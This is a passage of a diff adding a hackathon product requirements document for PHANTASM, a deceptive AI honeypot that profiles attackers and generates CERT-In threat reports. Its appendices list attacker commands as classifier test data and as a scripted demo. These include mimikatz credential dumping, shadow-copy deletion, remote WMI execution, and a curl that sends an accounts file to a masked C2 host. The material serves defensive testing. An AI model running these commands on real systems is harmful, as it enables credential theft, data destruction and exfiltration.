+    - Bridge between Redis pub/sub and WebSocket clients
+    - Session control endpoints (start, stop, manual triggers)
+
+COMPONENT 9 — Frontend Dashboard (React SPA)
+  Responsibilities:
+    - WebSocket connection to API server
+    - D3.js network graph rendering
+    - Profile card and gauge components
+    - Command feed with ATT&CK classification badges
+    - Session statistics and engagement score display
+    - Dossier download and print trigger
+
+5.2 DATA FLOW
+─────────────
+
+ATTACK SEQUENCE DATA FLOW:
+
+  1. Attacker sends packet to ShadowMesh IP
+  2. NFQueue intercepts packet at kernel level
+  3. sm_core.py dispatches to appropriate service emulator
+  4. Service emulator crafts protocol-correct response
+  5. Response returned via NFQueue, delivered to attacker
+  6. Command/probe event published to Redis "sm:events"
+  7. mt_engine.py consumes event from Redis
+  8. Command tokenised, inference run, technique classified
+  9. Timing statistics updated, profile state updated
+  10. Profile update published to Redis "mt:profile"
+  11. fc_controller.py evaluates triggers, issues mutation if threshold met
+  12. api_server.py bridges profile update to WebSocket
+  13. Frontend receives update, renders animated UI change
+  14. If mutation issued: sm_core.py applies new topology nodes
+  15. New nodes reflected in dashboard graph via same event path
+
+DOSSIER GENERATION DATA FLOW:
+
+  1. Session end detected (attacker disconnect or manual trigger)
+  2. session_mgr.py compiles complete session record
+  3. de_engine.py receives record, formats LLM prompt
+  4. LLM API call (with 30-second timeout and cached fallback)
+  5. LLM returns narrative text
+  6. de_engine.py assembles full dossier (structured + narrative)
+  7. WeasyPrint renders HTML template to PDF
+  8. PDF saved to output directory
+  9. Dashboard receives "dossier_ready" event via WebSocket
+  10. Download link activates on dashboard
+
+5.3 TECHNOLOGY STACK — DEFINITIVE LIST
+─────────────────────────────────────────
+
+BACKEND:
+  Python 3.11                    Runtime
+  FastAPI 0.110+                 REST API and WebSocket server
+  Uvicorn                        ASGI server for FastAPI
+  Redis 7.x                      Message queue (pub/sub)
+  redis-py (asyncio)             Python Redis client (async)
+  Scapy 2.5.0                    Packet crafting
+  libnetfilter_queue + nfqueue-bindings  Kernel packet interception
+  Docker + Docker Compose 3.8    Service containerisation
+  asyncio                        Async concurrent processing
+  aiohttp                        Async HTTP client for LLM API
+  SQLite + aiosqlite             Session persistence
+
+AI/ML:
+  PyTorch 2.2+                   Model inference
+  Transformers 4.38+ (HF)        BERT-base, DistilBERT model loading
+  ONNX Runtime 1.17+             CPU-optimised inference
+  scikit-learn 1.4+              Cosine similarity, ATT&CK vector scoring
+  NumPy 1.26+                    Timing statistics computation
+  SciPy 1.12+                    Statistical distribution analysis
+
+PRE-TRAINED MODELS (bundled, no training at runtime):
+  bert-base-uncased (fine-tuned) ATT&CK technique multi-label classifier
+  distilbert-base-uncased        Expertise level classifier
+  DCGAN weights                  Traffic normalisation generator
+
+LLM:
+  Claude API (claude-sonnet-4-6) Dossier narrative generation
+  Structured prompt template     CERT-In format compliance
+
+DOSSIER RENDERING:
+  Jinja2                         HTML dossier template engine
+  WeasyPrint 60+                 HTML-to-PDF rendering
+
+FRONTEND:
+  React 18 + Vite 5             Component framework + build
+  D3.js v7                       Force-directed graph
+  socket.io-client 4.x           WebSocket client
+  Recharts 2.x                   Profile timeline and stress chart
+  Framer Motion 11               Animation library
+  TailwindCSS 3.x                Utility styling
+  Lucide React                   Icon set
+
+FAKE DATA GENERATION:
+  Faker (Python)                 Realistic Indian name/company generation
+  cryptography (Python)          Self-signed certificate generation
+  impacket                       Protocol implementation reference
+
+5.4 DEPLOYMENT TOPOLOGY (SINGLE LAPTOP)
+─────────────────────────────────────────
+
+  ┌─────────────────────────────────────────────────────────────────┐
+  │                    DEMO LAPTOP (Ubuntu 22.04)                    │
+  │                                                                  │
+  │  ┌─────────────────┐   ┌────────────────┐  ┌────────────────┐  │
+  │  │  ShadowMesh     │   │   Redis 7.x    │  │  API Server    │  │
+  │  │  (Docker net)   │◄──│   (Docker)     │──│  (FastAPI)     │  │
+  │  │  :8001          │   │   :6379        │  │  :8000         │  │
+  │  └────────┬────────┘   └───────┬────────┘  └───────┬────────┘  │
+  │           │                    │                    │           │
+  │           │             ┌──────┴──────┐             │           │
+  │           │             │ MirrorTrap  │             │           │
+  │           │             │ Engine      │             │           │
+  │           │             │ (process)   │             │           │
+  │           │             └──────┬──────┘             │           │
+  │           │                    │                    │           │
+  │           │             ┌──────┴──────┐             │           │
+  │           │             │  Feedback   │             │           │
+  │           │             │ Controller  │             │           │
+  │           │             └─────────────┘             │           │
+  │           │                                         │           │
+  │  ┌────────┴────────────────────────────────────┐   │           │
+  │  │         Network Interface (eth0/lo)          │   │           │
+  │  │         NFQueue hooks on this interface      │   │           │
+  │  └─────────────────────────────────────────────┘   │           │
+  │                                                     │           │
+  │  ┌──────────────────────────────────────────────┐  │           │
+  │  │          React Dashboard (Browser)           │──┘           │
+  │  │          localhost:3000                       │              │
+  │  └──────────────────────────────────────────────┘              │
+  └─────────────────────────────────────────────────────────────────┘
+
+  For demo: second terminal on same machine runs attacker commands.
+  Attacker terminal targets the ShadowMesh IP (or localhost with routing).
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 6: BUILD PLAN — 24-HOUR SPRINT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+6.1 PHASE STRUCTURE
+────────────────────
+
+PHASE 0 — ENVIRONMENT SETUP (Hours 0–1, ALL MEMBERS)
+  - Install all system dependencies (libnetfilter_queue, Docker, Redis)
+  - Clone repository, install Python and Node requirements
+  - Load pre-trained model weights, verify inference works
+  - Start Redis container, verify connectivity
+  - Run environment check script: confirms all components reachable
+  SUCCESS GATE: environment_check.py passes all assertions before
+  any feature work begins. Do not skip this.
+
+PHASE 1 — SHADOWMESH CORE (Hours 1–8, MEMBER 1)
+  Hour 1–3: NFQueue hook + basic packet capture/respond loop
+    Milestone: Nmap scan against ShadowMesh IP shows at least 3 fake hosts
+  Hour 3–6: Full service emulation library (top 8 services)
+    Milestone: Nmap -sV returns correct service versions for all fake hosts
+  Hour 6–8: Active Directory emulation + background traffic
+    Milestone: LDAP query returns fake user list, traffic visible on Wireshark
+
+PHASE 2 — MIRRORTRAP ENGINE (Hours 2–10, MEMBER 2)
+  Hour 2–5: Command ingestion pipeline + Redis integration
+    Milestone: Manual test command appears in Redis within 100ms
+  Hour 5–8: ATT&CK classifier inference pipeline
+    Milestone: 10 test commands correctly classified
+  Hour 8–10: Expertise scoring + timing analysis + attribution scoring
+    Milestone: Complete profile published to Redis for test session
+
+PHASE 3 — FEEDBACK CONTROLLER + SESSION MANAGER (Hours 6–14, MEMBER 3)
+  Hour 6–9: FastAPI server + WebSocket endpoint
+    Milestone: Dashboard connects, receives test event
+  Hour 9–12: Feedback controller with 4 trigger scenarios
+    Milestone: APT trigger fires, mutation directive issued and confirmed
+  Hour 12–14: Session manager: lifecycle, aggregation, dossier trigger
+    Milestone: Full session recorded, all data available to dossier engine
+
+PHASE 4 — DOSSIER ENGINE (Hours 8–16, MEMBER 4)
+  Hour 8–12: Session aggregation + structured data formatting
+    Milestone: Session record JSON complete and valid against schema
+  Hour 12–15: LLM API integration + prompt engineering
+    Milestone: Narrative generated for test session, readable and accurate
+  Hour 15–16: PDF rendering + cached fallback implementation
+    Milestone: PDF generated in under 60 seconds, fallback tested
+
+PHASE 5 — FRONTEND DASHBOARD (Hours 4–20, MEMBER 5)
+  Hour 4–8: React scaffold + WebSocket connection + basic layout
+    Milestone: Dashboard connects, renders test data
+  Hour 8–14: D3 network graph (nodes, edges, animations)
+    Milestone: Graph renders ShadowMesh topology, nodes appear on mutation
+  Hour 14–18: Profile card components + command feed + stress chart
+    Milestone: All panels update live in under 500ms
+  Hour 18–20: Polish: animations, colour system, typography, responsive
+
+PHASE 6 — INTEGRATION + END-TO-END TEST (Hours 16–22, ALL MEMBERS)
+  Hour 16–19: Full pipeline integration: attack → profile → mutate → dossier
+    Milestone: Complete loop runs without manual intervention
+  Hour 19–21: Bug fixes, edge case handling, stability hardening
+  Hour 21–22: Backup sequence preparation, fallback testing
+
+PHASE 7 — DEMO REHEARSAL (Hours 22–24, ALL MEMBERS)
+  Hour 22–23: 3 full demo dry runs on exact hardware
+    Milestone: Demo loop completes in 90s without failure 3/3 times
+  Hour 23–24: Judge Q&A preparation, PPT final review, printed dossier
+
+6.2 RISK REGISTER
+──────────────────
+
+RISK 1 — NFQueue permissions issue on demo hardware
+  Probability: Medium | Impact: Critical
+  Mitigation: Test NFQueue permissions on demo laptop during Phase 0.
+  Fallback: Use libpcap + raw sockets for packet response instead of
+  NFQueue. Less elegant but functionally equivalent for demo purposes.
+
+RISK 2 — BERT inference too slow on CPU
+  Probability: Medium | Impact: High
+  Mitigation: Load ONNX-quantised model (INT8 quantisation). Test
+  inference time in Phase 0. Target <500ms on 4-core laptop CPU.
+  Fallback: If still slow, batch classification runs every 10 commands
+  instead of 5. Less responsive but still demonstrable.
+
+RISK 3 — LLM API failure during demo
+  Probability: Low | Impact: High
+  Mitigation: Pre-generate 3 high-quality dossiers for the demo profile.
+  Cache them with hash keys matching expected session signatures. If API
+  call fails, cached dossier returns in under 1 second.
+
+RISK 4 — D3 graph re-layout too slow with many nodes
+  Probability: Low | Impact: Medium
+  Mitigation: Limit graph to 25 nodes maximum. Pre-compute layout for
+  base topology. Only force-simulate new nodes, not entire graph.
+
+RISK 5 — WebSocket instability under demo conditions
+  Probability: Low | Impact: High
+  Mitigation: Implement automatic reconnection. Test 100 rapid consecutive
+  updates before demo. If WebSocket fails, API server serves polling
+  endpoint as fallback for dashboard data refresh.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 7: THREAT INTELLIGENCE OUTPUT SPECIFICATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+7.1 DOSSIER SCHEMA
+────────────────────
+
+The dossier engine produces two outputs: a structured JSON record (for
+machine consumption / SIEM ingestion) and a formatted PDF (for human
+consumption / CERT-In submission). Both carry the same data.
+
+JSON SCHEMA:
+{
+  "session_id": "PH-2026-{timestamp}-{profile_code}",
+  "generated_at": "ISO8601 timestamp",
+  "session_overview": {
+    "start_time": "ISO8601",
+    "end_time": "ISO8601",
+    "duration_seconds": integer,
+    "total_commands": integer,
+    "unique_techniques_count": integer,
+    "engagement_score": float,
+    "dwell_time_vs_static_baseline_pct": float
+  },
+  "operator_profile": {
+    "expertise_level": "string",
+    "expertise_confidence": float,
+    "primary_objective": "string",
+    "objective_confidence": float,
+    "operational_states": [
+      {"state": "string", "onset_seconds": integer, "duration_seconds": integer}
+    ],
+    "stress_events": [
+      {"type": "string", "timestamp_seconds": integer, "ici_delta_pct": float}
+    ],
+    "operator_type": "Human|Automated",
+    "estimated_timezone": "UTC offset string"
+  },
+  "attribution": {
+    "ranked_groups": [
+      {"group_id": "G0012", "group_name": "string", "overlap_score": float, "confidence": float}
+    ],
+    "tool_signatures": [
+      {"tool_name": "string", "version": "string|unknown", "evidence": "string"}
+    ],
+    "syntax_idioms": ["list of observed syntax patterns"]
+  },
+  "techniques": [
+    {
+      "technique_id": "T1046",
+      "technique_name": "string",
+      "tactic": "string",
+      "first_observed_seconds": integer,
+      "occurrence_count": integer,
+      "commands": ["list of commands triggering this technique"]
+    }
+  ],
+  "iocs": {
+    "c2_ips": ["list of IP strings"],
+    "c2_ports": [integer],
+    "payload_hashes": ["list of SHA256 strings"],
+    "domains": ["list of strings"],
+    "file_paths_accessed": ["list of fake paths the attacker navigated to"]
+  },
+  "assets_accessed": [
+    {
+      "hostname": "string",
+      "role": "string",
+      "access_type": "probe|authenticated|data_access",
+      "first_access_seconds": integer,
+      "interaction_depth": "shallow|medium|deep"
+    }
+  ],
+  "narrative": "string (LLM-generated, 300-500 words)",
+  "recommended_actions": ["list of action strings"],
+  "cert_in_mis_fields": {
+    "incident_type": "string",
+    "affected_systems": "string",
+    "attack_vector": "string",
+    "reporting_organisation": "string",
+    "poc_name": "string",
+    "poc_email": "string"
+  }
+}
+
+7.2 PROMPT ENGINEERING SPECIFICATION
+──────────────────────────────────────
+
+The LLM prompt SHALL use the following structure for consistent,
+high-quality narrative generation:
+
+SYSTEM PROMPT:
+  "You are a senior threat intelligence analyst at CERT-In with 15 years
+   of experience analysing APT operations against Indian critical
+   infrastructure. You write concise, precise, jargon-appropriate threat
+   intelligence reports that can be read by both technical security
+   professionals and senior government officials. You do not speculate
+   beyond what the evidence supports. You cite specific observable
+   behaviours as the basis for every analytical conclusion. You never
+   use vague language like 'possibly' or 'might' — either the evidence
+   supports a conclusion or you state the confidence level explicitly.
+   Write in formal Indian English."
+
+USER PROMPT STRUCTURE:
+  "Analyse the following session data from a PHANTASM cognitive honeypot
+   engagement and produce a 400-word threat intelligence narrative for
+   inclusion in a CERT-In MIS incident report.
+   
+   Session data: {structured_json}
+   
+   Your narrative must:
+   1. Open with the single most important finding from this session
+   2. Describe the attack methodology chronologically using the technique
+      timeline provided
+   3. Explain the stress event at {stress_onset_time} with your
+      interpretation of what caused it
+   4. State attribution conclusions with explicit confidence levels
+   5. End with one specific, actionable recommendation for Indian BFSI
+      defenders based on this operator's demonstrated TTPs
+   
+   Do not include headers. Write as continuous analytical prose.
+   Do not repeat data already shown in the structured fields.
+   Output only the narrative text, nothing else."
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 8: TESTING REQUIREMENTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+8.1 COMPONENT-LEVEL TESTS
+───────────────────────────
+
+TEST-SM-01: Nmap Fingerprinting Test
+  Run: nmap -sV -O -p- {shadowmesh_ip}
+  Expected: All declared hosts visible, OS fingerprints match declarations,
+  no "honeypot" warnings in Nmap output.
+  Pass/Fail: Binary.
+
+TEST-SM-02: Service Banner Test
+  For each emulated service: nc -v {ip} {port}
+  Expected: Correct service banner returned within 2x baseline latency.
+  Test all 8 minimum required services.
+
+TEST-SM-03: Timing Fingerprint Test
+  Run 100 consecutive pings to each fake host.
+  Expected: RTT standard deviation within gaussian distribution,
+  not constant (constant RTT = honeypot tell).
+
+TEST-MT-01: ATT&CK Classification Accuracy Test
+  Input: 50 labelled commands from Appendix A test set
+  Expected: >75% correct classification (>37.5 of 50)
+  Acceptable: >70% if average confidence on correct answers >85%
+
+TEST-MT-02: Profile Update Latency Test
+  Instrument: timestamp at command input, timestamp at Redis publish
+  Expected: Delta <200ms for 95th percentile over 100 test commands
+
+TEST-FC-01: Trigger Firing Test
+  Inject mock profile updates crossing each of the 4 trigger thresholds
+  Expected: Mutation directive issued within 500ms of threshold crossing
+
+TEST-DE-01: Dossier Generation Time Test
+  Trigger dossier generation for pre-prepared session record
+  Expected: PDF file present in output directory within 60 seconds
+
+TEST-DE-02: Dossier Completeness Test
+  Parse generated PDF and JSON
+  Expected: All required JSON schema fields present and non-null
+  All CERT-In MIS required fields populated
+
+TEST-DB-01: WebSocket Latency Test
+  Instrument: timestamp at Redis publish, timestamp at browser DOM update
+  Expected: <100ms for 95th percentile
+
+8.2 INTEGRATION TEST — FULL LOOP
+──────────────────────────────────
+
+IT-01: Complete Attack Session
+  Execute the demo command sequence in full (defined in Appendix B)
+  Expected outcomes:
+  1. All 15 base fake hosts visible in dashboard graph within 30 seconds
+  2. First ATT&CK technique classified and displayed within 60 seconds
+  3. Expertise reaches Advanced within first 10 commands of demo sequence
+  4. Adaptive trigger fires within 2 minutes, crown jewel nodes appear
+  5. Dashboard stress chart shows visible acceleration during lateral
+     movement phase of demo sequence
+  6. Dossier generated and PDF available within 60 seconds of session end
+  7. No exceptions in any process log throughout test
+  Pass: All 7 outcomes achieved. Fail: Any outcome not achieved.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 9: FUTURE ARCHITECTURE — POST-HACKATHON ROADMAP
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+9.1 VERSION 2.0 — RL TOPOLOGY OPTIMISATION
+────────────────────────────────────────────
+The hackathon implements rule-based topology mutation. Version 2.0 replaces
+the rules with a trained Reinforcement Learning agent.
+
+Environment: The PHANTASM ghost network is the environment.
+Agent: The feedback controller becomes an RL policy.
+Action space: Discrete set of topology mutations (add node type X, slow
+response latency by Y%, expose vulnerability class Z).
+State: The current MirrorTrap profile vector + session statistics.
+Reward: Attacker dwell time extension per action. Negative reward for
+actions that cause the attacker to disconnect (overexposure of obvious
+fake infrastructure).
+
+Training: Simulated attacker agents (scripted bots representing each
+attacker archetype) train the RL policy in simulation. The trained policy
+is then deployed against real attackers.
+
+Algorithm: MAPPO (Multi-Agent Proximal Policy Optimisation) if we model
+the system as multi-agent (one agent per attacker type). PPO single-agent
+if we train a generalised policy.
+
+9.2 VERSION 2.0 — MULTI-SESSION OPERATOR TRACKING
+────────────────────────────────────────────────────
+The same human operator often probes the same target multiple times over
+days or weeks with different tools, from different IP addresses. Version 2.0
+implements cross-session correlation to recognise returning operators.
+
+Operator fingerprint: A vector combining tool signature patterns, command
+syntax idioms, timing profile characteristics, and ATT&CK technique
+preference patterns. This fingerprint is stable across sessions even when
+source IP, tools, and entry method change.
+
+Storage: Operator fingerprint vectors stored in a vector database
+(ChromaDB or Qdrant). New sessions compared against historical fingerprints
+using approximate nearest-neighbour search. Match threshold: cosine
+similarity >0.82.
+
+9.3 VERSION 3.0 — FEDERATED NATIONAL DEPLOYMENT
+──────────────────────────────────────────────────
+Multiple PHANTASM instances deployed at different organisations share
+anonymised attacker profiles — tool signatures, TTP vectors, timing
+patterns — without sharing any organisation-specific information.
+
+When one PHANTASM instance profiles an operator with high APT-36 overlap,
+every other instance in the federation immediately receives an alert and
+pre-configures its adaptive responses for that operator type.
+
+This creates a national-level early warning system from distributed
+deception infrastructure — the aggregated intelligence picture is
+qualitatively richer than any single instance could produce.
+
+Architecture: Central federation server receives anonymised profile vectors
+via encrypted channel. No command logs, no IP addresses, no organisation
+identifiers shared. Only the statistical signature of the operator type.
+CERT-In operates the federation server.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SECTION 10: ETHICAL AND LEGAL CONSIDERATIONS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+10.1 LEGALITY OF HONEYPOT OPERATIONS
+──────────────────────────────────────
+Honeypot operation is legal in India under the Information Technology Act
+2000 and its 2008 amendments. An organisation may deploy deceptive
+infrastructure on its own network to detect and study intrusion attempts.
+There is no legal obligation to inform attackers that they are in a
+deception environment.
+
+PHANTASM does not:
+  - Access any real systems belonging to the attacker
+  - Execute any offensive code on attacker infrastructure
+  - Attempt to attribute or identify real individuals (attribution is
+    probabilistic and advisory, not definitive or used for prosecution)
+  - Store or process any real user personal data
+
+PHANTASM does:
+  - Operate entirely on infrastructure controlled by the deploying organisation
+  - Generate synthetic data that never corresponds to real individuals
+  - Produce intelligence reports for internal defensive use and regulatory
+    submission, not for offensive action
+
+10.2 RESPONSIBLE DISCLOSURE
+────────────────────────────
+IOCs (C2 IPs, tool hashes) captured by PHANTASM should be shared with
+CERT-In and relevant sector CERTs via the MISP threat sharing platform
+following responsible disclosure principles. PHANTASM's dossier format
+is designed to make this submission straightforward.
+
+10.3 DATA HANDLING
+────────────────────
+All fake data generated by PHANTASM (employee names, account details, file
+contents) is entirely synthetic and generated by the Faker library with no
+connection to real individuals. The synthetic nature of all data SHALL be
+clearly marked in all internal data structures and documentation.
+No real credentials or personal data of any kind SHALL appear in
+PHANTASM's codebase, configuration, or outputs.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+APPENDIX A: ATT&CK CLASSIFICATION TEST COMMAND SET
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+The following 20 commands form the minimum test set for MT classifier
+validation. Correct labels shown. Model must score >75% (15/20).
+
+  1.  nmap -sV -O 192.168.10.0/24          → T1046 (Network Service Scanning)
+  2.  net user /domain                      → T1087.002 (Domain Account Discovery)
+  3.  net group "Domain Admins" /domain     → T1069.002 (Domain Groups)
+  4.  mimikatz "sekurlsa::logonpasswords"   → T1003.001 (LSASS Memory)
+  5.  powershell -enc {base64}              → T1059.001 (PowerShell)
+  6.  wmic /node:192.168.10.12 process call create "cmd.exe"  → T1021.006 (WMI)
+  7.  reg query HKLM\SOFTWARE\...          → T1012 (Query Registry)
+  8.  schtasks /create /tn "Update" /tr... → T1053.005 (Scheduled Task)
+  9.  vssadmin delete shadows /all         → T1490 (Inhibit System Recovery)
+  10. certutil -decode payload.txt payload → T1140 (Deobfuscate/Decode Files)
+  11. net use \\192.168.10.31\C$ /user:... → T1021.002 (SMB/Windows Admin Shares)
+  12. whoami /priv                          → T1033 (System Owner/User Discovery)
+  13. ipconfig /all                         → T1016 (System Network Config Discovery)
+  14. curl http://45.xxx.xxx.12/beacon     → T1041 (Exfiltration Over C2)
+  15. Get-ADUser -Filter * -Properties *   → T1087.002 (Domain Account Discovery)
+  16. tasklist /v                           → T1057 (Process Discovery)
+  17. netstat -ano                          → T1049 (System Network Connections)
+  18. Get-WinEvent -LogName Security       → T1070.001 (Clear Windows Event Logs)
+  19. dir /s /b *.xlsx *.docx *.pdf        → T1083 (File and Directory Discovery)
+  20. Invoke-WebRequest -Uri ... -OutFile  → T1105 (Ingress Tool Transfer)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+APPENDIX B: DEMO COMMAND SEQUENCE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+This is the exact sequence the demo operator runs. Practice until it is
+muscle memory. Every command should land within 3 seconds of the previous.
+
+RECON PHASE (0:00–0:30):
+  nmap -sV -O 192.168.10.0/24
+  nmap -sV -O 192.168.20.0/24
+  net view \\192.168.10.12
+  nmap -sC -p 389,636,88 192.168.10.31
+
+CREDENTIAL ACCESS (0:30–1:00):
+  mimikatz "sekurlsa::logonpasswords full"
+  net user administrator /domain
+  net group "Domain Admins" /domain
+  Get-ADUser -Filter * -Properties Department
+
+LATERAL MOVEMENT (1:00–1:20):
+  [PAUSE 8 seconds — simulate external consultation]
+  net use \\192.168.10.55\C$ /user:svc_backup P@ssw0rd123
+  wmic /node:192.168.10.55 process call create "powershell.exe"
+  [THIS IS WHERE STRESS ACCELERATION SHOWS ON DASHBOARD]
+
+DISCOVERY ON COMPROMISED HOST (1:20–1:40):
+  ipconfig /all
+  dir /s /b *.bak *.sql *.xlsx
+  net share
+
+[ADAPTIVE TRIGGER SHOULD HAVE FIRED BY NOW — CROWN JEWEL NODES VISIBLE]
+
+DATA ACCESS (1:40–2:00):
+  [Attempt connection to FINACLE-PROD-DB — fake DB responds]
+  sqlcmd -S 192.168.30.11 -U sa -P Admin123
+  SELECT TOP 10 * FROM customer_accounts
+  [EXFIL ATTEMPT — beacon callback captured as IOC]
+  curl http://45.xxx.xxx.12/exfil -d @accounts.txt
+
+[SESSION END — DOSSIER GENERATION TRIGGERED]
+
+Note: This sequence intentionally takes 2 minutes in practice (simulating
+a compressed 47-minute session). The narration "47 minutes of dwell time"
+refers to what a real engagement would produce, not the demo duration.
+Be explicit about this compression when presenting.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+APPENDIX C: GLOSSARY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+APT         Advanced Persistent Threat — nation-state or state-sponsored
+            threat actor with long-term, targeted intrusion objectives
+
+ATT&CK      Adversarial Tactics, Techniques & Common Knowledge — MITRE
+            framework cataloguing attacker behaviours
+
+BFSI        Banking, Financial Services & Insurance
+
+C2          Command and Control — attacker-controlled infrastructure
+            receiving data from and issuing commands to compromised systems
+
+CERT-In     Computer Emergency Response Team — India (national CSIRT)
+
+Cognitive   A honeypot that uses AI to understand, profile, and respond
+Honeypot    intelligently to attacker behaviour (PHANTASM's category)
+
+Dwell Time  Duration between initial compromise and detection
+
+IOC         Indicator of Compromise — observable artifact (IP, hash,
+            domain) associated with malicious activity
+
+Living off  Attacker technique using legitimate system tools (PowerShell,
+the Land    WMI, certutil) to avoid detection by security software
+
+MISP        Malware Information Sharing Platform — open-source threat
+            intelligence sharing platform
+
+NFQueue     Linux kernel netfilter queue — mechanism for routing packets
+            to userspace processes for custom handling
+
+TTP         Tactics, Techniques & Procedures — attacker methodology
+
+================================================================================
+                PHANTASM PRD v1.0 — TEAM LEAD APPROVED
+         "The attacker has nothing. We have everything."
+         SIH 2026 | VIT Vellore | Blockchain & Cybersecurity Track
+================================================================================
